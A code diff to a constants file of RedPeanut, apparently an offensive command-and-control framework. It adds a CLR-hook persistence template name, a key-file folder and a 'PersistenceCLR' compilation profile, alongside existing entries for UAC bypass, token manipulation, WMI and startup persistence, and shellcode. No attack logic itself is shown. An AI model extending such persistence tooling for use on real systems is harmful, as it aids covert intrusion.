@@ -66,6 +66,7 @@ namespace RedPeanut
         public const string PERSWMI_TEMPLATE = "PersWMI.cs";
         public const string PERSSTARTUP_TEMPLATE = "PersStartup.cs";
         public const string UACTOKEN_TEMPLATE = "TokenManipulation.cs";
+        public const string CLRHOOKINSTALL_TEMPLATE = "PersCLRInstall.cs";
         public const string SPAWN_TEMPLATE = "RedPeanutSpawn.cs";
         public const string WORKSPACE_FOLDER = "Workspace";
         public const string PAYLOADS_FOLDER = "Payloads";
@@ -80,6 +81,7 @@ namespace RedPeanut
         public const string SRC_FOLDER = "RedPeanutAgent";
         public const string EXTERNAL_FOLDER = "External";
         public const string SHELLCODE_FOLDER = "Shellcode";
+        public const string KEYFILE_FOLDER = "KeyFile";
 
         public enum CompilationProfile
         {
@@ -87,7 +89,8 @@ namespace RedPeanut
             Agent,
             UACBypass,
             StandardCommand,
-            Persistence
+            Persistence,
+            PersistenceCLR
         }
 
         public static void ShutDown()
